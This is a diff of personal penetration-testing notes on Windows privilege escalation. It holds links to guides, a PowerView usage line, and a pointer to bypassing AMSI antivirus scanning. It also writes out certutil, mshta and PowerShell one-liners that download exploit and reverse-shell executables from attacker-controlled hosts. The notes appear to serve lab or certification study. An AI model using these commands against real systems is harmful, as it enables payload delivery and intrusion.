@@ -2,6 +2,7 @@ Windows Privilege Escalation tools to help me get system access.
 
 GREAT Privesc
 https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
+https://github.com/frizb/Windows-Privilege-Escalation
 
 Gread Windows Privilege Escalation Walk-through:
 https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
@@ -49,14 +50,13 @@ Import-Module .\PowerView.ps1
 Get-AdObject
 If you receive any errors it's possible AMSI is preventing execution. Look into AMSIbypass. EvilwinRM i use Bypass 4MSI
 
+Download file
 [Cert Util]
 certutil.exe -urlcache -split -f http[:]//10.10.10.10/exploit.exe
 
 [mshta]
 mshta http[:]//10.10.10.10/badthings.exe
 
-Download file
+[Powershell]
 powershell IWR -Uri http[:]//myip/filename.exe -OutFile filename.exe
 powershell "(new-object System.Net.WebClient).Downloadfile('http[:]//10.10.14.15:8000/revshell.exe', 'revshell.exe')"
-
-https://github.com/frizb/Windows-Privilege-Escalation
